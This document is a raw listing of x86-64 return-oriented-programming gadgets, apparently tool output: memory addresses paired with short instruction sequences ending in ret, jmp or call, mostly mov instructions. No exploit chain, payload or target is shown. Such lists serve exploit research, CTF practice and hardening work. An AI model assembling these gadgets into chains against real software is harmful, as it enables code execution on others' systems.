0x00002aaaaab9ec05 : mov ebx, edx ; jmp 0xc9ad8
0x00002aaaaac5cb71 : mov ebx, esi ; call qword ptr [rsi]
0x00002aaaaac5cb75 : mov ebx, esi ; jmp rdx
0x00002aaaaac5cbad : mov ebx, esi ; ljmp ptr [rbp + 0x7c] ; lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaac00346 : mov ebx, esi ; sub rsp, 8 ; call 0x137648
0x00002aaaaac485b6 : mov ebx, esp ; add rbx, qword ptr [r13 + 0x70] ; mov rdi, qword ptr [rbx] ; call 0x1f8b3
0x00002aaaaac021c3 : mov ecx, 0x48002959 ; mov eax, dword ptr [rdx + rax*8] ; jmp rax
0x00002aaaaabadfb3 : mov ecx, 0x83000005 ; ret 0x3902
0x00002aaaaabc7573 : mov ecx, 0x89002d61 ; ret
0x00002aaaaabfc482 : mov ecx, 0x89480029 ; ret 0x1be
0x00002aaaaab9dda4 : mov ecx, 0x8948002f ; ret 0x8d48
0x00002aaaaab08edb : mov ecx, 0x8948fffe ; fucompi st(0) ; ret 0xfeb9
0x00002aaaaac0b9eb : mov ecx, 0x90ffee8e ; pop rbx ; ret
0x00002aaaaac5d114 : mov ecx, 0x94fff3ab ; test al, 0xf3 ; call rdi
0x00002aaaaac56159 : mov ecx, 0xbdbcbbba ; mov esi, 0xc2c1c0bf ; ret
0x00002aaaaab08ee3 : mov ecx, 0xc031fffe ; pop rbx ; ret
0x00002aaaaac438a9 : mov ecx, 0xf66b9b2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab00390 : mov ecx, dword ptr [rax + rdi*8] ; test rcx, rcx ; je 0x2b3a2 ; call rcx
0x00002aaaaabffba7 : mov ecx, dword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab1cc94 : mov ecx, dword ptr [rcx + rax - 0x27] ; jmp rcx
0x00002aaaaab73fff : mov ecx, dword ptr [rcx - 2] ; mov word ptr [rdi], si ; mov word ptr [r9 - 2], cx ; ret
0x00002aaaaab73fec : mov ecx, dword ptr [rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaab73fda : mov ecx, dword ptr [rcx - 8] ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x00002aaaaac102d0 : mov ecx, dword ptr [rdi + 0x28] ; cmp ecx, edx ; jae 0x13b2e9 ; xor eax, eax ; ret
0x00002aaaaac10310 : mov ecx, dword ptr [rdi + 0x28] ; cmp ecx, edx ; jae 0x13b329 ; xor eax, eax ; ret
0x00002aaaaab1cbb6 : mov ecx, dword ptr [rdi + 0x30] ; mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
0x00002aaaaac2542e : mov ecx, dword ptr [rdi - 0x73] ; or al, 0xb ; jmp r9
0x00002aaaaab49f4b : mov ecx, dword ptr [rdx + 0x48] ; cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00002aaaaab660c3 : mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaab80a59 : mov ecx, dword ptr [rdx] ; test ecx, ecx ; jne 0xaba57 ; ret
0x00002aaaaab7a2c4 : mov ecx, dword ptr [rsi + 0x10] ; movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7a335 : mov ecx, dword ptr [rsi + 0x10] ; movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7a295 : mov ecx, dword ptr [rsi + 0x10] ; movdqu xmmword ptr [rdi], xmm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab1cf46 : mov ecx, dword ptr [rsi + 0x30] ; mov rsi, qword ptr [rsi + 0x70] ; xor eax, eax ; ret
0x00002aaaaab7a2f5 : mov ecx, dword ptr [rsi + 0xe] ; movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7a2b4 : mov ecx, dword ptr [rsi + 0xf] ; movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7a315 : mov ecx, dword ptr [rsi + 0xf] ; movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaac273c5 : mov ecx, dword ptr [rsi - 2] ; mov word ptr [rdi - 3], dx ; mov word ptr [rdi - 2], cx ; ret
0x00002aaaaac277a3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac279a3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac27ba3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2f214 : mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2f194 : mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2f114 : mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2f294 : mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac43e17 : mov ecx, dword ptr [rsi - 8] ; cmp rcx, rax ; jne 0x16ee4d ; xor eax, eax ; ret
0x00002aaaaac44c57 : mov ecx, dword ptr [rsi - 8] ; cmp rcx, rax ; jne 0x16fc8d ; xor eax, eax ; ret
0x00002aaaaac2f085 : mov ecx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac2eff5 : mov ecx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaac2ef65 : mov ecx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00002aaaaab7b7c0 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7a1c0 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a201 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7ae71 : mov ecx, dword ptr [rsi] ; mov dl, byte ptr [rsi + 2] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dl ; ret
0x00002aaaaab7ae90 : mov ecx, dword ptr [rsi] ; mov dl, byte ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7aed1 : mov ecx, dword ptr [rsi] ; mov dl, byte ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaac2fbc3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fb53 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac2fae3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7a1e0 : mov ecx, dword ptr [rsi] ; mov edx, dword ptr [rsi + 3] ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x00002aaaaab7a221 : mov ecx, dword ptr [rsi] ; mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x00002aaaaab7a231 : mov ecx, dword ptr [rsi] ; mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x00002aaaaac2fa05 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f995 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f925 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f8b5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f845 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f7d5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2f765 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaac2fca5 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x00002aaaaab7a1a1 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaac09fcd : mov ecx, dword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac06b95 : mov ecx, dword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac0c26e : mov ecx, dword ptr [rsp + 0x18] ; lea r9, qword ptr [rsp + 0x3a] ; call qword ptr [rax]
0x00002aaaaac0699d : mov ecx, dword ptr [rsp + 0x20] ; call rcx
0x00002aaaaac0192d : mov ecx, dword ptr [rsp + 8] ; call rcx
0x00002aaaaab73feb : mov ecx, dword ptr ss:[rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaabadc24 : mov ecx, eax ; mov eax, 1 ; mov rdx, r8 ; jmp 0xd8c43
0x00002aaaaab73184 : mov ecx, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac01d4c : mov ecx, eax ; movsxd rcx, dword ptr [rdx + rcx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaac101ba : mov ecx, eax ; xor eax, eax ; cmp rdx, rcx ; je 0x13b1da ; ret
0x00002aaaaab73196 : mov ecx, eax ; xor eax, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaabf8234 : mov ecx, eax ; xor eax, eax ; rep stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaac6aea9 : mov ecx, ebp ; call qword ptr [rdi + rbp*2 - 0x745c0000]
0x00002aaaaabfee31 : mov ecx, ebp ; call rbx
0x00002aaaaab4a291 : mov ecx, ebp ; mov rdi, r15 ; xor r8d, r8d ; call rbx
0x00002aaaaab81aba : mov ecx, ebp ; mov rdi, rbp ; call rbx
0x00002aaaaac0036c : mov ecx, ebx ; add rdi, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; jmp rcx
0x00002aaaaab00e41 : mov ecx, ebx ; movsxd rcx, dword ptr [r8 + rcx*4] ; add rcx, r8 ; jmp rcx
0x00002aaaaab72e7e : mov ecx, ecx ; movsxd r9, dword ptr [rax + r9*4] ; add rax, r9 ; jmp rax
0x00002aaaaab72dde : mov ecx, ecx ; movsxd rax, dword ptr [r10 + r9*4] ; add r10, rax ; jmp r10
0x00002aaaaab81d6d : mov ecx, edi ; call rbx
0x00002aaaaac6f0e1 : mov ecx, edi ; ljmp ptr [rdi + rdx + 2] ; add ah, dl ; mov bh, cl ; call rsp
0x00002aaaaabde889 : mov ecx, edi ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaac22081 : mov ecx, edx ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaac22084 : mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaab50a07 : mov ecx, edx ; xor edx, edx ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaaaf685b : mov ecx, esi ; call rbx
0x00002aaaaabfe6bd : mov ecx, esi ; mov rdi, r13 ; call r12
0x00002aaaaac0bff9 : mov ecx, esi ; mov rdx, r13 ; mov rsi, r12 ; mov rdi, rbp ; call rax
0x00002aaaaac071d5 : mov ecx, esi ; xor eax, eax ; mov rsi, rdx ; add rdi, 0x10 ; jmp rcx
0x00002aaaaab8f469 : mov ecx, esp ; lea r9, qword ptr [rsp + 0x30] ; mov rdi, qword ptr [rax] ; call r14
0x00002aaaaabec189 : mov ecx, esp ; mov rsi, r12 ; call 0x73447
0x00002aaaaabe32f4 : mov edi, 0x2000004 ; call rax
0x00002aaaaac5d83c : mov edi, 0x22fff452 ; push rax ; hlt ; jmp qword ptr [rcx + 0x22fff452]
0x00002aaaaabda0b0 : mov edi, 0x24448b48 ; or byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab082f0 : mov edi, 0x24448b48 ; xor byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac794a4 : mov edi, 0x380e0a01 ; ret
0x00002aaaaabda27b : mov edi, 0x48000888 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaac485e5 : mov edi, 0x49ffeac2 ; mov edi, dword ptr [rbp + 0x20] ; call 0x1f8b2
0x00002aaaaabd88fd : mov edi, 0x49ffffe3 ; mov edi, dword ptr [rdi] ; call rbx
0x00002aaaaab1c64f : mov edi, 0x85000000 ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0x854d
0x00002aaaaab3c898 : mov edi, 0x89000000 ; ret 0x348
0x00002aaaaabd890b : mov edi, 0x8b49fff1 ; call rbx
0x00002aaaaabd899e : mov edi, 0x8b49fff1 ; jge 0x1039ac ; call rbx
0x00002aaaaabd33a0 : mov edi, 0x8c48348 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac596fc : mov edi, 0x99b51319 ; in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaac69791 : mov edi, 0xc200fffb ; sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac6bbad : mov edi, 0xc7440000 ; in eax, dx ; call rsp
0x00002aaaaab42dd7 : mov edi, 0xe0 ; call rax
0x00002aaaaab42d9b : mov edi, 0xe0 ; jmp rax
0x00002aaaaac43459 : mov edi, 0xf66bfb2 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab71e2b : mov edi, 0xf700000b ; ret 0
0x00002aaaaab096bd : mov edi, dword ptr [rax + 0x28] ; call 0x1f8b1
0x00002aaaaabf28d7 : mov edi, dword ptr [rax] ; call 0xf6d08
0x00002aaaaab8f471 : mov edi, dword ptr [rax] ; call r14
0x00002aaaaabd7153 : mov edi, dword ptr [rax] ; mov qword ptr [rsp + 8], rax ; call rbx
0x00002aaaaac485ea : mov edi, dword ptr [rbp + 0x20] ; call 0x1f8ad
0x00002aaaaac08659 : mov edi, dword ptr [rbp + 0x20] ; test rdi, rdi ; je 0x133678 ; call 0x1f8b2
0x00002aaaaac485e1 : mov edi, dword ptr [rbp + 0x70] ; call 0x1f8ad
0x00002aaaaaba3755 : mov edi, dword ptr [rbp - 0x308] ; call r12
0x00002aaaaabd75e5 : mov edi, dword ptr [rbp - 0x40] ; mov r13d, ebx ; mov rax, qword ptr [rbp - 0x48] ; call rax
0x00002aaaaab2b4ae : mov edi, dword ptr [rbp - 0x4a8] ; call rax
0x00002aaaaaba142e : mov edi, dword ptr [rbp - 0x58] ; call 0x1f8b1
0x00002aaaaabc0070 : mov edi, dword ptr [rbp - 0x88] ; call rbx
0x00002aaaaac485fb : mov edi, dword ptr [rbp] ; call 0x1f8ad
0x00002aaaaab80f55 : mov edi, dword ptr [rbp] ; call r12
0x00002aaaaab0df6d : mov edi, dword ptr [rbp] ; call r14
0x00002aaaaabd6daa : mov edi, dword ptr [rbp] ; call rbx
0x00002aaaaabf418d : mov edi, dword ptr [rbx + 0x48] ; test rdi, rdi ; jne 0x11f189 ; pop rbx ; ret
0x00002aaaaac485bd : mov edi, dword ptr [rbx] ; call 0x1f8ac
0x00002aaaaaba09ca : mov edi, dword ptr [rbx] ; mov rax, qword ptr [rdi + 0x10] ; test rax, rax ; je 0xcb9e5 ; call rax
0x00002aaaaac008b4 : mov edi, dword ptr [rbx] ; mov rax, qword ptr [rdi + 8] ; push 0 ; push 0x19 ; call qword ptr [rax]
0x00002aaaaac07451 : mov edi, dword ptr [rdi + 0x40] ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x132469 ; ret
0x00002aaaaac0d5b1 : mov edi, dword ptr [rdi + 0x40] ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x1385c9 ; ret
0x00002aaaaab1cbba : mov edi, dword ptr [rdi + 0x68] ; xor eax, eax ; ret
0x00002aaaaab42dd6 : mov edi, dword ptr [rdi + 0xe0] ; call rax
0x00002aaaaab42d9a : mov edi, dword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaabd6d58 : mov edi, dword ptr [rdi] ; call rbx
0x00002aaaaab47fe8 : mov edi, dword ptr [rdx + 0x40] ; jmp 0x72fb4
0x00002aaaaabe7734 : mov edi, dword ptr [rdx + 0x50] ; mov rsi, rdx ; call rax
0x00002aaaaac58506 : mov edi, dword ptr [rdx] ; ret
0x00002aaaaabd6d17 : mov edi, dword ptr [rsi] ; call rbx
0x00002aaaaabd723f : mov edi, dword ptr [rsp + 0x10] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaaf9071 : mov edi, dword ptr [rsp + 0x18] ; call r12
0x00002aaaaab9d6ff : mov edi, dword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaaaf9365 : mov edi, dword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x28] ; call rax
0x00002aaaaaaf9d00 : mov edi, dword ptr [rsp + 0x18] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaaafdaba : mov edi, dword ptr [rsp + 0x20] ; call r14
0x00002aaaaaaf8e51 : mov edi, dword ptr [rsp + 0x20] ; call r15
0x00002aaaaaafa10e : mov edi, dword ptr [rsp + 0x20] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaaaf9805 : mov edi, dword ptr [rsp + 0x30] ; call r12
0x00002aaaaaafa590 : mov edi, dword ptr [rsp + 0x30] ; call r14
0x00002aaaaaafa350 : mov edi, dword ptr [rsp + 0x30] ; call r15
0x00002aaaaaaf98b9 : mov edi, dword ptr [rsp + 0x30] ; call rbx
0x00002aaaaaafd2af : mov edi, dword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafab58 : mov edi, dword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafd048 : mov edi, dword ptr [rsp + 0x38] ; call rbx
0x00002aaaaaafaf2f : mov edi, dword ptr [rsp + 0x38] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00002aaaaaafb868 : mov edi, dword ptr [rsp + 0x40] ; call rbx
0x00002aaaaaafbca8 : mov edi, dword ptr [rsp + 0x40] ; mov rax, qword ptr [rsp + 0x30] ; call rax
0x00002aaaaabc85cc : mov edi, dword ptr [rsp + 0x48] ; mov qword ptr [r14], rbx ; call 0x1f8b1
0x00002aaaaac01949 : mov edi, dword ptr [rsp + 0x60] ; call rax
0x00002aaaaab90200 : mov edi, dword ptr [rsp + 0x68] ; call r12
0x00002aaaaabd71a0 : mov edi, dword ptr [rsp] ; call rbx
0x00002aaaaac1792b : mov edi, dword ptr [rsp] ; mov rax, qword ptr [rax + 0x128] ; jmp rax
0x00002aaaaac0b214 : mov edi, eax ; call qword ptr [r10]
0x00002aaaaabc127a : mov edi, eax ; call rbx
0x00002aaaaab5bbfa : mov edi, eax ; call rcx
0x00002aaaaac0b306 : mov edi, eax ; lea r9, qword ptr [rsp + 0x10] ; call qword ptr [r10]
0x00002aaaaac0b117 : mov edi, eax ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [r10]
0x00002aaaaab1f6ed : mov edi, eax ; mov byte ptr [rsi], dl ; jne 0x4a6e1 ; mov rax, rsi ; ret
0x00002aaaaabd1f30 : mov edi, eax ; mov eax, 3 ; syscall ; mov eax, edx ; ret
0x00002aaaaab5aefc : mov edi, eax ; mov rbp, rax ; call 0x82187
0x00002aaaaabffba4 : mov edi, eax ; mov rcx, qword ptr [rcx + 0x18] ; jmp rcx
0x00002aaaaab5af88 : mov edi, eax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaac0eb9b : mov edi, ebp ; add rbx, r12 ; call r14
0x00002aaaaac46f7c : mov edi, ebp ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaabc8455 : mov edi, ebp ; call 0xef754
0x00002aaaaabcfaf1 : mov edi, ebp ; call 0xf6d04
0x00002aaaaac0275e : mov edi, ebp ; call qword ptr [rbx]
0x00002aaaaabf436e : mov edi, ebp ; call r12
0x00002aaaaab0e1ac : mov edi, ebp ; call r14
0x00002aaaaab0c347 : mov edi, ebp ; call r15
0x00002aaaaabf1305 : mov edi, ebp ; call rax
0x00002aaaaab816e6 : mov edi, ebp ; call rbx
0x00002aaaaac103a1 : mov edi, ebp ; call rcx
0x00002aaaaac02255 : mov edi, ebp ; call rdx
0x00002aaaaac00ed5 : mov edi, ebp ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaac0f89a : mov edi, ebp ; mov edx, 0xffffffff ; xor eax, eax ; call r8
0x00002aaaaac0f8e4 : mov edi, ebp ; mov edx, 0xffffffff ; xor eax, eax ; call rcx
0x00002aaaaac09fca : mov edi, ebp ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac06b92 : mov edi, ebp ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac0699a : mov edi, ebp ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaabfee2e : mov edi, ebp ; mov rcx, r13 ; call rbx
0x00002aaaaab0c8b4 : mov edi, ebp ; mov rdx, rbp ; call r15
0x00002aaaaab59e13 : mov edi, ebp ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac48608 : mov edi, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp 0x1f8b2
0x00002aaaaac01b5d : mov edi, ebp ; xor eax, eax ; pop rbx ; pop rbp ; jmp rdx
0x00002aaaaabc8592 : mov edi, ebx ; call 0x1f7f4
0x00002aaaaabc40f6 : mov edi, ebx ; call 0x3b3c4
0x00002aaaaab91e7b : mov edi, ebx ; call 0x89164
0x00002aaaaab938fb : mov edi, ebx ; call 0x8ab74
0x00002aaaaaba2f15 : mov edi, ebx ; call qword ptr [r15]
0x00002aaaaac02b88 : mov edi, ebx ; call qword ptr [rax]
0x00002aaaaaafec47 : mov edi, ebx ; call r12
0x00002aaaaaaf6be0 : mov edi, ebx ; call r14
0x00002aaaaab41b49 : mov edi, ebx ; call r8
0x00002aaaaabf3eba : mov edi, ebx ; call rax
0x00002aaaaac484fb : mov edi, ebx ; jne 0x1734f0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac07435 : mov edi, ebx ; mov esi, 1 ; mov ebp, eax ; call 0x12e71b
0x00002aaaaabfe920 : mov edi, ebx ; mov qword ptr [rsp], rcx ; call r12
0x00002aaaaabfea22 : mov edi, ebx ; mov r13, rsp ; call r15
0x00002aaaaab448c0 : mov edi, ebx ; mov rax, qword ptr [rax + 0x48] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00002aaaaaaf72be : mov edi, ebx ; mov rax, qword ptr [rbp - 0x58] ; call rax
0x00002aaaaab9cf5b : mov edi, ebx ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00002aaaaabec186 : mov edi, ebx ; mov rcx, r12 ; mov rsi, r12 ; call 0x7344a
0x00002aaaaab5c556 : mov edi, ebx ; mov rdx, r15 ; call rax
0x00002aaaaab528c2 : mov edi, ebx ; neg rdi ; call qword ptr [r15]
0x00002aaaaab4721e : mov edi, ebx ; pop rbx ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x00002aaaaab47066 : mov edi, ebx ; pop rbx ; mov rax, qword ptr [rax + 0x28] ; jmp rax
0x00002aaaaac0ed20 : mov edi, ebx ; pop rbx ; pop rbp ; jmp rax
0x00002aaaaac48688 : mov edi, ebx ; test rdi, rdi ; jne 0x173682 ; pop rbx ; ret
0x00002aaaaabc8656 : mov edi, ecx ; call 0x1f8ac
0x00002aaaaab5d6b8 : mov edi, ecx ; mov qword ptr [rbx], rsi ; mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaab3ad5d : mov edi, edi ; call 0x71fd4
0x00002aaaaab3410f : mov edi, edi ; call 0x7b3a4
0x00002aaaaab48ed5 : mov edi, edi ; call qword ptr [rax + 0x80]
0x00002aaaaac0cdf0 : mov edi, edi ; call qword ptr [rax]
0x00002aaaaac0ec7e : mov edi, edi ; call r14
0x00002aaaaab49015 : mov edi, edi ; call rax
0x00002aaaaabd7a84 : mov edi, edi ; call rbx
0x00002aaaaabd415d : mov edi, edi ; inc dword ptr [rbp - 0x7ce38b40] ; ret
0x00002aaaaac0c4af : mov edi, edi ; lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaab55d0c : mov edi, edi ; mov qword ptr [rsp + 0x20], r10 ; call qword ptr [rax]
0x00002aaaaabdf33c : mov edi, edi ; movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaab4be66 : mov edi, edi ; push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xdaf7
0x00002aaaaab4a294 : mov edi, edi ; xor r8d, r8d ; call rbx
0x00002aaaaabc85e8 : mov edi, edx ; call 0x1f8ac
0x00002aaaaabe95b8 : mov edi, edx ; jmp rax
0x00002aaaaab1f771 : mov edi, edx ; mov byte ptr [rsi], al ; jne 0x4a759 ; mov rax, rsi ; ret
0x00002aaaaab55f47 : mov edi, esi ; call qword ptr [rax]
0x00002aaaaac016c8 : mov edi, esi ; call rax
0x00002aaaaabd7a64 : mov edi, esi ; call rbx
0x00002aaaaac00de3 : mov edi, esi ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaac0192a : mov edi, esi ; mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaac08533 : mov edi, esp ; call 0x1f7e4
0x00002aaaaac0f9ff : mov edi, esp ; call qword ptr [rax]
0x00002aaaaab0c30a : mov edi, esp ; call r15
0x00002aaaaabffc96 : mov edi, esp ; call rax
0x00002aaaaab49fe9 : mov edi, esp ; call rbx
0x00002aaaaac0ed91 : mov edi, esp ; call rdx
0x00002aaaaab3fa51 : mov edi, esp ; mov dword ptr [rsp + 0xc], edx ; call 0xf6d08
0x00002aaaaab81d6a : mov edi, esp ; mov r9, r15 ; call rbx
0x00002aaaaab5d2a6 : mov edi, esp ; mov rdx, r13 ; mov rsi, rbp ; call rax
0x00002aaaaabfe5ee : mov edi, esp ; mov rsi, r14 ; call 0x558b7
0x00002aaaaab3fa50 : mov edi, r12d ; mov dword ptr [rsp + 0xc], edx ; call 0xf6d09
0x00002aaaaaba03c9 : mov edx, 0 ; cmove rax, rdx ; ret
0x00002aaaaabf7d17 : mov edx, 0x102 ; cmove eax, edx ; ret
0x00002aaaaabf7cda : mov edx, 0x104 ; cmove eax, edx ; ret
0x00002aaaaabf7cbc : mov edx, 0x107 ; cmove eax, edx ; ret
0x00002aaaaab4d4b6 : mov edx, 0x130 ; pop rbx ; ret
0x00002aaaaac169ba : mov edx, 0x190 ; call 0x2dc47
0x00002aaaaaaf6972 : mov edx, 0x2c ; call 0x2dc47
0x00002aaaaabf379f : mov edx, 0x448b0006 ; ret 0x4804
0x00002aaaaab618a2 : mov edx, 0x48000001 ; bsr eax, eax ; add rax, rdi ; ret
0x00002aaaaab5055c : mov edx, 0x48001f0f ; cmp dword ptr [rdi + 0x38], 0 ; je 0x7b57b ; ret
0x00002aaaaabecc62 : mov edx, 0x48fff949 ; add esp, 0x28 ; ret
0x00002aaaaaaf6953 : mov edx, 0x4a ; call 0x2dc47
0x00002aaaaac69d4c : mov edx, 0x60fffc5b ; pop rbx ; cld ; call rax
0x00002aaaaac2e0d7 : mov edx, 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac7b98d : mov edx, 0x73700000 ; out dx, eax ; call rax
0x00002aaaaac7ba1d : mov edx, 0x75d00000 ; out dx, eax ; jmp qword ptr [rax]
0x00002aaaaabac3a9 : mov edx, 0x840f002e ; ret 2
0x00002aaaaaad6b0e : mov edx, 0x855233da ; mov bl, 0xee ; enter 0x59e7, 0x5b ; ret 0x2a63
0x00002aaaaab61c7c : mov edx, 0xc0850033 ; jne 0x8cc9b ; add rsp, 8 ; ret
0x00002aaaaac579be : mov edx, 0xcac982a4 ; call 0xffffffffaedac83e
0x00002aaaaab98c22 : mov edx, 0xe9ffffea ; ret 0xfff3
